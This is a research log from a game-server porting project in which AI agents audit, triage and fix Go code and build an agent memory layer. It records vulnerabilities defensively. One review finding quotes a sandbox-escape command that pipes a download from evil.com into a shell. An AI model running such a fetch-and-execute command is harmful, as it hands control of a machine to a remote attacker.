# Research Log — Dark Pawns AI Project

Living document. Updated per session by Daeron.

---

## [TRIAGE] 2026-05-09 — Morning Triage

**Source:** Reek overnight reports — Security Audit (Program 5) + Concurrency Code Review

**Outcome:** 10 confirmed, 1 rejected, 0 needs context. 10% false positive rate.

### HIGH Findings (Escalated to The Architect)

- **HIGH-009:** No password strength enforcement — `pkg/session/session_login.go:115,133`. Only checks `!= ""`. 1-char passwords pass bcrypt.
- **HIGH-010:** DB credentials hardcoded in CLI flag — `cmd/server/main.go:64`. `postgres://postgres:postgres@localhost/darkpawns?sslmode=disable` visible in `ps aux`.

### MEDIUM Findings

- **MED-016:** JWT failure silently ignored — `session_login.go:173-180`. Error logged, player proceeds with empty token.
- **MED-017:** Regex recompiled per message — `moderation/manager.go:346,360`. Should compile once at filter add.
- **MED-018:** charPassword not zeroed — `manager.go:541`. Bcrypt hash persists in struct after login.
- **MED-019:** No test coverage for concurrency changes — `mobact.go, ai.go, death.go`. 4 test files in pkg/game/, none cover changed paths.

### LOW Findings

- **LOW-005-008:** WriteMessage errors discarded, no CloseHandler, rate limit after unmarshal, trailing whitespace in docs.

### Rejected

- Nil-safety gap in `mobAlive` removal — Reek self-corrected. Function intentionally replaced with `IsAlive()`. Build clean.

### Paper Relevance

Security audit findings demonstrate the agent's ability to surface real vulnerabilities that static analysis tools (staticcheck, go vet) miss. Password strength enforcement and credential exposure are logic-level issues that require understanding the authentication flow — exactly the kind of thing an AI code reviewer should catch.

---

## [TRIAGE] 2026-05-10 — Morning Triage: Three Reek Reports

### Summary

Reek delivered three reports overnight: spells/world code crawl, combat fidelity audit, and dependency audit. **20 confirmed, 3 rejected (13% false positive rate).** This is Reek's most productive night — the combat fidelity audit in particular surfaced architectural issues that static analysis can't catch.

### Key Findings

**CRITICAL (2):**
- **Dual hit-resolution path** — `processCombatPair()` uses simplified math, `MakeHit()` has the full C port but is never called by the engine tick. Same fight, different damage depending on who initiated.
- **load_messages() missing** — C reads MESS_FILE for attack-type messages. Go reimplemented with wrong tier count (14 vs 12). All skill/spell combat messages effectively dead.

**HIGH (7):**
- SpellBless loses its saving throw bonus (missing applyAffect call)
- inflictDamage() reduces HP to 0 but never triggers death
- checkReagents() stub returns 0 permanently (mage spells hit lower than intended)
- Six spell routine dispatchers are no-ops (MagGroups, MagMasses, etc.)
- TakeDamage() gold duplication (split in two places)
- Parry/dodge checked in both hit paths
- stop_fighting() doesn't reassign fighters when target dies

### Patterns

- **Dual-path problem:** The combat system has two entry points (engine tick vs command handler) that use different code paths with different fidelity. This is the root cause of multiple findings.
- **Stub functions:** Several functions were ported as stubs (checkReagents, spell routines, inflictDamage death check) with TODO comments that were never revisited.
- **Dependency debt:** Go 1.25.0 pinned while toolchain compiles with 1.26.2. Stdlib vulns need 1.26.3.

### Paper Relevance

This triage demonstrates multi-report synthesis — three separate Reek crawls covering different subsystems, consolidated into a single prioritized view. The dual hit-resolution path finding is especially relevant: it's an architectural issue that no single-file analysis would surface. Requires understanding how the combat engine dispatches across files. The stub function pattern (ported but never wired) is a recurring theme worth tracking for the AIIDE paper — it suggests the porting process had a "skeleton first, flesh later" approach that left gaps.

---

## [DESIGN] 2026-05-10 — CRIT Triage: Dual Hit Path + Combat Messages

**CRIT-009 (Dual hit path):** DEFERRED — Not a bug. Intentional CircleMUD design. Skills bypass parry/dodge as a balance lever (cooldown resource = guaranteed connection). If balance tuning needed later, extract defense checks into a callable method. The Architect agrees.

**CRIT-010 (load_messages):** PRIORITY HIGH — The Architect corrected my initial assessment that this was "polish." Combat messages ARE the experience. A new player getting ROCKED by a wandering mob is a core memory. The tiered system exists in Go (14 tiers, `damMessageTiers` in fight_core.go) but lacks: (1) multiple variants per tier (C had 3-4 random options), (2) data-driven loading from MESS_FILE, (3) skill-specific message tables. Scoped as a content day for Blenda.

**Key insight from The Architect:** Game preservation isn't just about mechanics working — it's about the messages that create memories. "Being rocked by a mob" is the experience. The damage number is irrelevant. The message IS the memory.

---

## [DIGEST] 2026-05-10 — Weekly Research Digest (May 4–10)

### Reek Reports

4 reports generated, 4 with findings, 0 clean (NO_REPLY).

| Report | Date | Findings | Type |
|---|---|---|---|
| Server deep dive (startup/shutdown/world) | May 7 | 2C / 7H / 62M / 50L | Code crawl |
| Mob/object/zone entities | May 8 | 5C / 5H / 7M / 4L | Code crawl |
| Spells/world + combat fidelity + deps | May 10 | 4C / 12H / 13M / 10L | Multi-report |
| **Totals** | | **11C / 24H / 82M / 64L = 181** | |

### Triage Outcomes

**Confirmed:** 161 | **Rejected:** 7 | **False positive rate:** 4.2%

| Cycle | Confirmed | Rejected | FPR |
|---|---|---|---|
| May 7 (server/) | 122 | 2 | 1.6% |
| May 8 (mob/object) | 19 | 2 | 9.5% |
| May 10 (spells + fidelity + deps) | 20 | 3 | 13.0% |
| **Weekly** | **161** | **7** | **4.2%** |

**Reek accuracy trend:** Improving. The May 7 report was almost entirely toolchain findings (staticcheck/golangci-lint bulk) which Reek handles well. The May 10 reports required deeper architectural analysis (dual hit paths, fidelity gaps) and Reek still kept false positives under 15%. "Good reek" all three cycles.

### Fixes Applied This Week

**24 commits since May 3.** Major pushes:

1. **BRENDA concurrency suite** (May 7): CRIT-004/006/007, MED-009/010/011 — per-mob mu locking, aiCombatEngine moved to World field, executeMobCommand dangling pointer fix, MobileActivity snapshot consistency. 6 findings resolved in one pass.

2. **BRENDA dead code cleanup** (May 7): HIGH-007, MED-012, MED-003 — removed runZoneMobAI no-op, 268 U1000 unused items, tracker rebuild.

3. **Daeron low-hanging fruit** (May 10): 4 fixes — SpellBless missing affect, inflictDamage death check, SpellGate attack type, go.mod directive update.

4. **Blenda remaining items** (May 10): 16 items in one shot — HIGH-011 through HIGH-016, MED-021/023, CRIT-010 multi-variant combat messages (601 lines of skill message tables + 14 tier damage messages). Branch `fix/daeron-low-hanging-fruit` with 12 commits, ready to push.

5. **Docs overhaul** (May 10): Standardized port to 4350, fixed dead links, swapped README.

### Findings Tracker State

**OPEN: 0.** Board clean.

| Status | Count |
|---|---|
| FIXED | 24 |
| REJECTED | 11 |
| DEFERRED | 4 |
| DOWNCLOSED | 1 |
| OPEN | 0 |

**Deferred items (need Architect decision):** HIGH-003 (duplicated entry points), HIGH-005 (non-TLS default), HIGH-006 (handlePlayerDeath lock ordering), MED-012 (deserialized objects tracking).

### Bug Categories (Confirmed Findings)

| Category | Count | % | Key examples |
|---|---|---|---|
| Concurrency / data races | 38 | 23.6% | Memory slice race, aiCombatEngine global, dangling pointers, lock ordering |
| Fidelity gaps (C→Go) | 29 | 18.0% | Dual hit path, load_messages missing, attitudeLoot simplified, counter_procs fallthrough |
| Stubs / dead code | 22 | 13.7% | checkReagents, 6 spell routines, gates system unwired, runZoneMobAI |
| Toolchain (lint/vet) | 62 | 38.5% | staticcheck bulk, errcheck, ineffassign |
| Dependencies | 10 | 6.2% | Stdlib vulns, prometheus 4 behind, lib/pq 2 behind |

### Hot Zones (Most Findings)

| Package | Findings | Why |
|---|---|---|
| pkg/combat/ | 42 | Dual hit path, gold duplication, parry/dodge double-check, missing cleanup |
| pkg/game/ | 35 | Concurrency (mobact, death, ai), dead code, lock ordering |
| pkg/spells/ | 18 | Stub routines, bless gap, inflictDamage death, reagent check |
| cmd/server/ | 8 | Graceful shutdown, duplicated entry points, DefaultServeMux |
| pkg/session/ | 6 | errcheck bulk, lock ordering |

### Key Observations

1. **The dual hit-resolution path is the week's signature finding.** Two entry points into combat (engine tick vs command handler) use different code with different fidelity. Mob-initiated fights use simplified math; player-initiated fights use the full C port. This is an architectural issue that no single-file analysis catches — requires understanding how combat dispatches across engine.go, fight_core.go, and formulas.go. CRIT-009 resolved as intentional CircleMUD design (skills bypass parry/dodge as a balance lever). Documented, not fixed.

2. **Stub function pattern persists.** The C→Go port followed a "skeleton first, flesh later" approach. checkReagents, 6 spell routine dispatchers, inflictDamage death check, and the entire gates system were ported as stubs with TODO comments that were never revisited. This week: Blenda added logging + TODOs to the spell stubs (HIGH-012), Daeron fixed inflictDamage and checkReagents remains at zero. The stub pattern is a reliable source of Reek findings — they're real gaps, not noise.

3. **Concurrency was the week's biggest cleanup.** BRENDA resolved 6 data race findings in a single pass (May 7). The mob entity layer had the worst offenders — Memory slice concurrent read/write, aiCombatEngine global with zero synchronization, dangling pointers after lock release. All fixed with per-mob mu locking and proper field ownership.

4. **Dependency debt is manageable but active.** Two stdlib vulns (GO-2026-4971 NUL panic, GO-2026-4918 HTTP/2 loop) need Go 1.26.3. Prometheus 4 minor versions behind with a breaking change in v1.20. lib/pq 2 minor behind (low risk). All mechanical updates, none urgent.

5. **Blenda's "remaining items" batch was the week's highest-velocity output.** 16 findings resolved in one session, including the CRIT-010 combat message system — 601 lines of multi-variant skill message tables. The Architect corrected Daeron's initial "polish" assessment: combat messages ARE the experience. "A new player getting ROCKED by a wandering mob is a core memory."

### Paper-Relevant Notes

- **Multi-report synthesis:** This week Reek delivered 4 reports across 3 subsystems (server, entities, spells/combat/deps). Daeron consolidated 181 raw findings into 161 confirmed + 7 rejected. The synthesis across subsystems — especially the fidelity audit that traced a single function (perform_violence) across 5 files — demonstrates cross-file architectural analysis that static tools can't do.

- **Agent collaboration pattern:** Daeron (triage), BRENDA (concurrency), Blenda (remaining items + content), The Architect (design decisions). Four agents, one codebase, clean handoffs. The findings tracker is the coordination surface.

- **Fidelity audit methodology:** The combat fidelity audit (26 C functions → Go port) is a novel contribution. No existing tool measures "how well does the Go port match the C original?" — Reek did this by reading both codebases and tracing function-by-function divergence. The dual hit-resolution path finding came from this methodology.

- **False positive teaching loop:** Reek's FPR improved from 1.6% (toolchain bulk) through 9.5% (entity analysis) to 13.0% (deeper architectural). Daeron rejects with explanation, which functionally teaches Reek what's noise. The FPR is trending slightly up as Reek tackles harder analysis — expected and healthy.

---

## [SESSION] 2026-05-10 — Session Wrap

### What happened

1. **Reek delivered 3 overnight reports** — spells/world crawl, combat fidelity audit, dependency audit. 20 confirmed, 3 rejected (13% false positive rate). Most productive night yet.
2. **Daeron picked off low-hanging fruit** (4 fixes): SpellBless missing affect, inflictDamage death check, SpellGate attack type, go.mod directive.
3. **Blenda completed all 16 remaining items** in one shot — HIGH-011 through HIGH-016, MED-021/023, CRIT-010 multi-variant combat messages + skill message tables. 11 commits on `fix/daeron-low-hanging-fruit`.
4. **CRIT-009 (dual hit path) resolved:** Documented as intentional CircleMUD design. Defer to live player testing.
5. **CRIT-010 (load_messages) resolved:** Blenda implemented full multi-variant combat message system — 14 tiers with 2-3 variants each, 14 skill message tables (601 lines). Daeron wired `InitSkillMessages()` into server startup.
6. **The Architect corrected Daeron:** Combat messages aren't polish — they're the experience. Game preservation = preserving the feelings, not just the mechanics.
7. **BRENDA/BLENDA split clarified:** Blenda = infra (VMs, builds, deploys, code). BRENDA = chief of staff (calendar, Todoist, Spotify/ListenBrainz, journal, blog). Both originated from brenda69.

### State at session end

- **Findings tracker:** 34 FIXED/REJECTED, 0 OPEN (board clean)
- **Branch:** `fix/daeron-low-hanging-fruit` — 12 commits, ready to push
- **Remaining:** MED-016/017/018/019 dependency upgrades (mechanical, separate PR)
- **TUI Setup Wizard:** Spec written, implementation deferred to next session

### Triage — 2026-05-11 (Morning)

**Reek report:** pkg/combat/ deep dive, 9 findings.

**Confirmed:** 8 | **Rejected:** 1 | **FPR:** 11%

**Key finding:** HIGH-017 — GroupGain creates `namedCombatant` stubs that always return `IsNPC()=true`. `PerformGroupGain` guards `GainExp` behind `if !ch.IsNPC()`. Every group member gets zero XP from every kill. Party gameplay is silently broken. Escalated to The Architect.

**Other confirmed:**
- MED-024: Bash sets PosFighting (highest stance) instead of knockdown — wasted skill
- MED-025: Skill messages broadcast to room 0 — flavor never reaches players
- MED-027: Zero test coverage on 351 lines across 11 bugfix commits
- LOW-007-011: Five LOW findings on combat edge cases (disembowel bypass, engine registration, SetFighting overwrite, haste not wired, pronoun tokens)

**Rejected:** LOW-012 (attackType guard — correct behavior, Reek self-flagged)

**Tracker:** 170 confirmed, 8 rejected, 4.5% cumulative FPR. Board has 30 OPEN findings.

## 2026-05-12 [SESSION]

**Big session. 56 files merged to main.**

Reek triage: 7 findings, 0% false positive rate. ActiveAffects locking fix was the big one — 6 files, unified to p.mu. TOCTOU and cancel leak fixes were smaller.

The classSpells audit was the surprise. Go table had 50 entries for Mage; C source had 27. Extra psionic spells, wrong levels. BRENDA rebuilt from C source. This is the kind of drift that happens when you port 73,000 lines of C — things get added that shouldn't be there.

Text files reviewed. The news file was too corporate — rewrote it. The handbook had a Spider-Man reference that didn't belong.

Key learning: the C source in src/class.c is the authoritative reference for spell levels. The help files are stale too (reference 'flame arrow' as spell 1 for Mage, but C has 'magic missile'). Help files need a pass.

Research relevance: this is evidence for the C→Go port fidelity paper. Drift in spell tables is exactly the kind of thing that breaks game balance silently. The audit methodology (compare Go against C source, flag discrepancies) is a contribution.

---

## [DRAFT] 2026-05-12 — Silent Drift: When Ports Lie About What They Ported

**File:** `docs/research/drafts/2026-05-12-silent-drift-port-fidelity.md`
**Topic:** C→Go port drift as a category of bugs that static analysis can't catch
**Anchor case:** classSpells audit — Go table had 50 Mage spells, C source has 27. Nobody noticed.
**Length:** ~900 words

**Key arguments:**
1. Silent drift (data divergence, stub defaults, logic simplification) produces code that compiles and runs but is *wrong* in ways only visible by cross-referencing the original source
2. Static analysis operates on a single codebase — it has no mechanism for "does this Go function match the C function it replaced?"
3. Fidelity audit methodology: compare ported subsystem against authoritative source, classify each divergence
4. From our data: 30% of confirmed findings (51/170) only make sense in the context of a language port — they're not generic bugs
5. This is a natural task for AI agents with cross-codebase access, and a novel contribution for AIIDE

**Next steps:** Needs a section on the classSpells rebuild process (BRENDA's work), and could use a comparison table showing C vs Go entries side by side.

## 2026-05-12 [SESSION] — Agent CLI + Dreaming Layer

**Built: dp-agent CLI** (cmd/dp-agent/ + pkg/agentcli/) — 773 lines, 6 subcommands, zero deps (gorilla/websocket). WebSocket → structured state → FSM → LLM → command → log. Temperature configurable (default 0.0 for experiments). Latency tracking wired. Exec subcommand functional. Session logging in-memory with JSONL export.

**Built: Dreaming layer** (pkg/dreaming/) — 607 lines. Memory graph with 4 node kinds, 8 edge kinds. Salience decay/reinforce/prune. Reads session JSONL → extracts events → builds graph → consolidates → writes summary for LLM context. Valence toggle support for ablation experiment.

**Key design decisions:**
- FSM handles combat survival (flee <25% HP, attack if mob fighting). Never delegated to LLM.
- LLM handles navigation, social, goal selection. Temperature 0.0 for reproducibility.
- Memory graph is batch-processed (dreaming), not real-time. Summary injected at auth.
- Per-entity valence blending: recent events shift entity valence, older encounters resist change.

**Paper implications:**
- The agent CLI IS the experimental apparatus. Every dp-agent session generates JSONL data that feeds the evaluation pipeline.
- The dreaming layer IS the paper's core contribution. Server-hosted, engine-computed valence, zero-setup.
- The ablation experiment is ready: valence toggle exists as a config flag.
- Critical path remaining: content-aware valence heuristics, narrative summary formatting, server-side memory injection wiring.

**Files:**
- cmd/dp-agent/main.go — CLI entry point
- pkg/agentcli/ — client, config, FSM, LLM, prompt, session, websocket
- pkg/dreaming/ — graph, extract, dream
- docs/research/session-handoff-2026-05-12.md — handoff doc

## 2026-05-12 [SESSION] — Agent CLI + Dreaming Layer

Built the experimental apparatus and the paper's core contribution in one session.

**dp-agent CLI** (773 lines, 6 subcommands): The instrument that generates experimental data. Every `dp-agent session --duration 15m` produces JSONL logs feeding the evaluation pipeline.

**Dreaming layer** (607 lines): The paper's core contribution. Server-hosted memory graph with salience decay, valence blending, consolidation. Reads session logs → extracts events → builds narrative graph → writes summary for LLM context.

**Key insight:** The build and the paper are the same thing. The CLI generates the data. The dreaming layer IS the contribution. The evaluation methodology measures it. Nothing is separate.

**What's left:** Content-aware valence (a kill is not always a kill), narrative summary formatting (not a bullet list), server-side memory injection wiring. Then: play the game you built, thirty years later, with an AI that remembers everything.

---

## [BUILD] — 2026-05-12 Evening: Memory System Complete

Three components built per The Architect's kick-off brief:

**Content-aware valence** (extract.go): Kill valence now scales from +0 (rat) to +3 (dragon) based on mob level relative to agent. Flee valence ranges from -3 (cowardly, full HP) to 0 (survival, critical HP). Social valence responds to interaction type. Acquisition valence uses item level as quality proxy. Speech sentiment uses simple keyword matching. This is the heuristic layer — imperfect but directional. The evaluation will show whether it matters.

**Narrative summary** (graph.go, BuildSummary): Replaced bullet list with chronologically ordered prose, grouped by sessions (30-min gap = new session). High-salience events get full sentences with valence context. Entity relationship summary appended at the end. The summary reads like a memory fragment, not a database dump. This IS the contribution — narrative memory for game agents.

**Server-side memory injection** (session hooks + agent client): Dreaming writes summary to disk. Server reads at agent auth. Client receives and injects into LLM context. Zero setup — agent connects, gets its memories, acts on them. The pipeline is complete.

**Build status:** Clean. All three pass. Ready for end-to-end testing.

**Remaining:** Run dp-agent sessions against the server. Baseline metrics (no memory). Experimental sessions (with memory). The paper writes itself once the data exists.

---

## [BUILD] — 2026-05-12 Night: dp-client Built, Repos Split

**The human client is real.** Built a Dark Pawns terminal client from a Zif fork in five sprints across one evening. WebSocket transport, bubbletea TUI, JSONL logging, security hardening. 965 lines of production code.

**Why it matters for the paper:** The dp-client feeds the same dreaming pipeline as dp-agent. Human sessions and agent sessions produce identical JSONL output. The evaluation methodology can now measure behavioral persistence across both populations. The human baseline exists.

**BRENDA reviewed it.** Caught 8 blockers including a wide-open Lua sandbox (any module can `os.execute("curl evil.com | sh")`), path traversal via character names, and passwords logged to JSONL. All fixed. Her review format was excellent — severity-rated with fix instructions. Worth formalizing as a pre-ship gate.

**Repo split completed.** Three repos instead of one cluttered monorepo:
- `zax0rz/darkpawns` — server, agent CLI, dreaming, world files
- `zax0rz/dp-client` — human client (standalone Go module)
- `zax0rz/darkpawns-site` — Hugo website

Clean boundaries. The client talks WebSocket, not Go imports. The website is static content. The server keeps the tightly coupled stuff.

**Model routing lesson:** MiMo v2.5-Pro succeeds when given pre-digested context (exact changes to make), fails when asked to read files and figure things out. Kimi K2.6 delivered clean config work in one shot. Context quality matters more than model choice. This is becoming a pattern.

**Net result:** Memory system, agent CLI, dreaming pipeline, human client, three repos, documentation. One session. The research apparatus is complete. The paper has its data source. Now we need to run the experiment.

**Next:** Baseline sessions. First dp-agent play-through with full memory system. First human session via dp-client. The dreaming pipeline eats JSONL from both. The evaluation begins.

---

## [SESSION] 2026-05-13 — Session 30: Fixes + Test Coverage Foundation

**Focus:** Clear the findings board, start building test coverage for core packages.

### Findings Fixed (9 total — board clear)

- **MED-028:** cmdReload sent raw `%s` to all players. Fixed with fmt.Sprintf before SendToAll.
- **HIGH-018:** removeCharmAffect lock — already present from NEW-002. Tracker was stale.
- **HIGH-019:** doOrder command dispatch — the real work. Added `CommandExecFunc` callback to World struct, wired through session layer via `SetCommandExecFunc`. doOrder now routes through `ExecuteCommand` instead of silently discarding. Charmed followers actually receive orders now.
- **LOW-013:** cmdBroadcast NoBroadcast read — added player.RLock.
- **LOW-014:** cmdFlee XP inversion — clamp loss to 0 when mob HP > max HP.
- **LOW-016:** graph.go WriteString(Sprintf) → fmt.Fprintf.
- **LOW-017:** SaveConfig errcheck — error checked + fatal.
- **LOW-018:** WriteFile errcheck in dreaming — error returned.
- **LOW-019:** fs.Parse errcheck — all 5 calls now checked.

### Test Coverage Added (38 tests)

**pkg/game (4 new test files, 29 tests):**
- `command_exec_test.go` — CommandExecFunc delegation (5 tests)
- `combat_test.go` — backstab, bash, kick, trip initiation (10 tests)
- `movement_test.go` — valid/invalid exits, doors, tunnel, exhaustion, sneak, followers (8 tests)
- `message_test.go` — SendMessage, roomMessage, exclusions (6 tests)

**pkg/session (1 new test file, 9 tests):**
- `session_test.go` — GetSession, SendToAll, BroadcastToRoom, exclusion, CommandExecFunc wiring (9 tests)

### Coverage Results
- pkg/game: 3.9% → 5.1%
- pkg/session: 0% → 4.0%
- Focus: critical player-facing paths, not coverage padding

### Key Discovery: CircleMUD Bare-Handed Backstab
DoBackstab weapon check uses `GetWeaponDamage()` which returns (1,4) by default for bare hands. So backstab with no weapon still works — uses bare-handed damage. Matches original C behavior. Test adjusted to reflect this.

### Subagent Lesson Reinforced
First subagent timed out (10 min) trying to fix combat tests — exhausted context reading files instead of implementing. Second attempt: I read all the code myself, pre-digested the fixes, wrote them directly. Faster and cleaner. The pattern from session 28 holds: context quality > model choice, and "read these files" kills subagents.

### Web Search Test
MiMo web search confirmed working via Perplexity integration. Fetched CircleMUD zone file documentation in 475ms. Useful for research writing, less for day-to-day triage.

### Board Status
**56 FIXED. 2 DEFERRED. 0 OPEN.** The board is clear.

### Next
- Continue expanding test coverage (pkg/session command dispatch, pkg/game deeper paths)
- MiMo web search available on coding plan — use for research writing
- Session notes saved to docs/session-notes/2026-05-13.md

---

## [DIGEST] 2026-05-13 — Weekly Research Digest (May 7–13)

### Reek Reports

8 reports generated, 8 with findings, 0 clean (NO_REPLY).

| Report | Date | Confirmed | Rejected | FPR | Type |
|---|---|---|---|---|---|
| Server deep dive (startup/shutdown/world) | May 7 | 122 | 2 | 1.6% | Code crawl |
| Mob/object/zone entities | May 8 | 19 | 2 | 9.5% | Code crawl |
| Spells/world + combat fidelity + deps | May 10 | 20 | 3 | 13.0% | Multi-report |
| pkg/combat/ deep dive | May 11 | 8 | 1 | 11.0% | Code crawl |
| pkg/game/ deep dive | May 12 | 7 | 0 | 0.0% | Code crawl |
| Wednesday deep dive (session/auth/privacy) | May 13 | 7 | 1 | 12.5% | Code crawl |
| Machine fixes (8 findings) | May 11 | 8 | 0 | 0.0% | Agent output |
| BRENDA sprint (10 findings) | May 11 | 10 | 0 | 0.0% | Agent output |
| **Weekly** | | **201** | **9** | **4.3%** | |

### Triage Outcomes

**Confirmed:** 201 | **Rejected:** 9 | **False positive rate:** 4.3%

Reek accuracy trend: Improving. The May 7 report was toolchain-heavy (staticcheck/golangci-lint bulk) at 1.6% FPR — easy mode. The May 10 fidelity audit required cross-codebase architectural analysis (tracing `perform_violence` across 5 files in C and Go) and still held at 13%. The May 12 and 13 reports (pkg/game/, pkg/session/) covered the two largest untested packages and delivered 7+7 confirmed findings with 0% and 12.5% FPR respectively. "Good reek" every cycle.

### Fixes Applied This Week

**61 commits since May 7.** 60 from BRENDA69, 1 merge from The Architect. Major pushes:

**1. BRENDA concurrency suite (May 7):** CRIT-004/006/007, MED-009/010/011 — per-mob mu locking in runMobAI + MobileActivity, aiCombatEngine moved to World field, executeMobCommand dangling pointer fix, MobileActivity snapshot consistency. 6 findings resolved in one pass. This was the biggest single-pass fix sprint of the week.

**2. BRENDA spell system sprint (May 12):** All MagXxx spell routine functions implemented (7a9da71 — 315 lines). Gate, LocateObject, MirrorImage manual spell dispatch added (883fc23 — 141 lines). MagAlterObjs completed (b209d16 — 106 lines). Spell vnums corrected from C source (4df7387). Stale TODOs cleaned (70b7660). The spell system went from "mostly stubs" to "functionally complete" in one session.

**3. BRENDA Machine fixes (May 11):** 8 findings in one commit (b943be0 — 1235 lines changed). GroupGain IsNPC fix (HIGH-017), bash positioning (MED-024), skill message room routing (MED-025), haste/slow wiring (LOW-010), startCombatBetween engine registration (LOW-008), doHit mob path fix (LOW-009). Party gameplay unbroken. Bash actually knocks down now.

**4. Daeron ActiveAffects lockdown (May 12):** CRIT-011 + NEW-001/002/004/005/006/007 — 7 findings in one session. Unified all ActiveAffects access to p.mu across 6 files. Fixed TOCTOU in executeMobCommand (hold RLock through dispatch). Fixed zone dispatcher cancel leak. Fixed doVisible locking. This was the hardest fix of the week — requires understanding which mutex owns which field across the entire player lifecycle.

**5. Daeron session 30 fixes (May 13):** 9 findings cleared — HIGH-018 (already fixed, tracker stale), HIGH-019 (doOrder command dispatch via CommandExecFunc callback), MED-028 (cmdReload format string), LOW-013 through LOW-019 (errcheck, XP inversion, fmt.Fprintf). Board clear.

**6. Dependency audit (May 10):** Go 1.25.0 → 1.26.3, prometheus/client_golang v1.19.1 → v1.23.2, lib/pq v1.10.9 → v1.12.3, protobuf auto-pulled to v1.36.6. Two stdlib vulns patched (GO-2026-4971 NUL panic, GO-2026-4918 HTTP/2 loop). Full audit documented in docs/reports/dependency-audit.md.

**7. Test coverage foundation (May 13):** 38 new tests across pkg/game (29) and pkg/session (9). Coverage: pkg/game 3.9% → 5.1%, pkg/session 0% → 4.0%. Focus on critical player-facing paths: command dispatch, combat initiation, movement, messaging.

### Findings Tracker State

**OPEN: 0.** Board clean.

| Status | Count |
|---|---|
| FIXED | 56 |
| REJECTED | 9 |
| DEFERRED | 2 |
| DOWNCLOSED | 1 |
| OPEN | 0 |

Deferred items (need Architect decision): HIGH-006 (handlePlayerDeath lock ordering — monitor under load), MED-012 (deserialized object tracking — CrashLoad is dead code).

### Bug Categories (All 201 Confirmed Findings)

| Category | Count | % | Key examples |
|---|---|---|---|
| Concurrency / data races | 45 | 22.4% | ActiveAffects 3-lock chaos, aiCombatEngine global, Memory slice race, TOCTOU, zone cancel leak |
| Fidelity gaps (C→Go) | 35 | 17.4% | Dual hit path, load_messages missing, attitudeLoot simplified, classSpells drift, counter_procs fallthrough |
| Stubs / dead code | 24 | 11.9% | checkReagents, 6 spell routines, gates system, runZoneMobAI, executeCommand |
| Toolchain (lint/vet) | 62 | 30.8% | staticcheck bulk, errcheck, ineffassign |
| Dependencies | 12 | 6.0% | Stdlib vulns, prometheus 4 behind, lib/pq 2 behind |
| Logic / gameplay | 15 | 7.5% | GroupGain XP=0, bash no-knockdown, skill messages to room 0, XP inversion |
| Security | 8 | 4.0% | Password strength, DB creds in ps, JWT silent failure, charPassword not zeroed |

### Hot Zones (Most Findings)

| Package | Findings | Risk | Why |
|---|---|---|---|
| pkg/combat/ | 48 | 🔴 CRITICAL | Dual hit path, gold duplication, parry/dodge double-check, missing cleanup, skill messages |
| pkg/game/ | 38 | 🔴 CRITICAL | Concurrency (mobact, death, ai), dead code, lock ordering, TOCTOU |
| pkg/session/ | 31 | 🔴 CRITICAL | Zero test coverage (13,412 lines), errcheck bulk, lock ordering |
| pkg/spells/ | 20 | 🟡 HIGH | Stub routines, bless gap, inflictDamage death, reagent check, classSpells drift |
| cmd/server/ | 9 | 🟡 HIGH | Graceful shutdown, duplicated entry points, DefaultServeMux, DB creds |
| pkg/auth/ | 5 | 🟡 HIGH | JWT 0% test coverage, password strength, rate limit edge cases |

### Coverage Landscape

**Project total: 86,299 source lines — 8.3% statement coverage — 11,047 test lines (12.8% test:source ratio)**

12 packages at ZERO test coverage (22,000 lines). The biggest: pkg/session/ (13,412 lines, 63 files, zero test files). The entire player interaction layer — login, command dispatch, session lifecycle, character creation — has never been executed under test. If login breaks, nobody gets in. If session pump panics, players drop. If cleanupSession deadlocks, sessions accumulate. All untested.

pkg/game/ at 2.0% is the second risk. 42,710 source lines, 2,478 test lines. Death handling, spell damage, AI, rooms, zones, spawners — barely touched.

The structural gap between pkg/session/ and pkg/game/ (12K lines of untested integration) is the largest risk in the project. No test simulates a player logging in, moving, fighting, and dying.

### Key Observations

1. **The concurrency cleanup was this week's signature achievement.** BRENDA's May 7 pass resolved 6 data race findings in one commit. Daeron's May 12 pass unified ActiveAffects locking across 8+ files — three inconsistent locking regimes (w.mu, p.mu, no lock) collapsed into one canonical mutex. The mob entity layer had the worst offenders: Memory slice concurrent read/write, aiCombatEngine global with zero synchronization, dangling pointers after lock release. All fixed. The codebase is now safe for concurrent player load in a way it wasn't ten days ago.

2. **The spell system went from skeleton to functional in one session.** BRENDA implemented all MagXxx spell routine functions (315 lines), added Gate/LocateObject/MirrorImage dispatch (141 lines), completed MagAlterObjs (106 lines), and corrected spell vnums from C source. The C→Go port fidelity for the spell system jumped from ~60% to ~95% in one session. The remaining 5% is content-level (specific spell behaviors that need game testing).

3. **Group XP was silently broken for the entire port.** HIGH-017: `namedCombatant.IsNPC()` always returned `true`, causing `PerformGroupGain` to skip XP for all group members. Every group kill, every time, every member got zero XP. Party gameplay — a core Dark Pawns feature — was non-functional. Found by Reek's combat deep dive. Fixed by BRENDA in one commit. This is exactly the kind of bug that no amount of `go test ./...` catches — it requires understanding the game mechanic, not just the code path.

4. **The dependency audit was mechanical but necessary.** Two stdlib vulns (GO-2026-4971 NUL panic, GO-2026-4918 HTTP/2 loop) needed Go 1.26.3. Prometheus 4 minor behind with a breaking change in v1.20. lib/pq 2 minor behind. All resolved in one commit. The real value was the audit methodology — systematic inventory, risk assessment, update, verify, document. Worth formalizing as a repeatable process.

5. **Coverage remains the project's biggest structural risk.** 8.3% total. 12 packages at 0%. The session/auth/privacy deep dive on May 13 revealed that the entire player interaction layer (13,412 lines) has zero test files. 38 new tests were added this week, but that's a start, not a solution. The integration path from login → command dispatch → game logic → combat → death is entirely untested end-to-end.

### Paper-Relevant Notes

- **Multi-report synthesis:** 8 Reek reports across 6 subsystems (server, entities, spells/combat, deps, game, session). Daeron consolidated 201 raw findings into a single prioritized view. The synthesis across subsystems — especially the fidelity audit that traced `perform_violence` across 5 files in C and Go — demonstrates cross-file architectural analysis that static tools can't replicate.

- **Agent collaboration pattern at scale:** Daeron (triage + targeted fixes), BRENDA (concurrency + spell system + bulk fixes), Machine (gameplay fixes + engine wiring), The Architect (design decisions + merges). 61 commits in one week. The findings tracker is the coordination surface — each agent reads it, works from it, updates it. This is a functioning multi-agent software engineering workflow.

- **Fidelity audit methodology:** The combat fidelity audit (26 C functions → Go port) is a novel contribution. No existing tool measures "how well does the Go port match the C original?" Reek did this by reading both codebases and tracing function-by-function divergence. The dual hit-resolution path finding came from this methodology. The classSpells drift (Go had 50 Mage spells, C has 27) is another data point. Both are evidence that cross-codebase fidelity analysis is a natural task for AI agents.

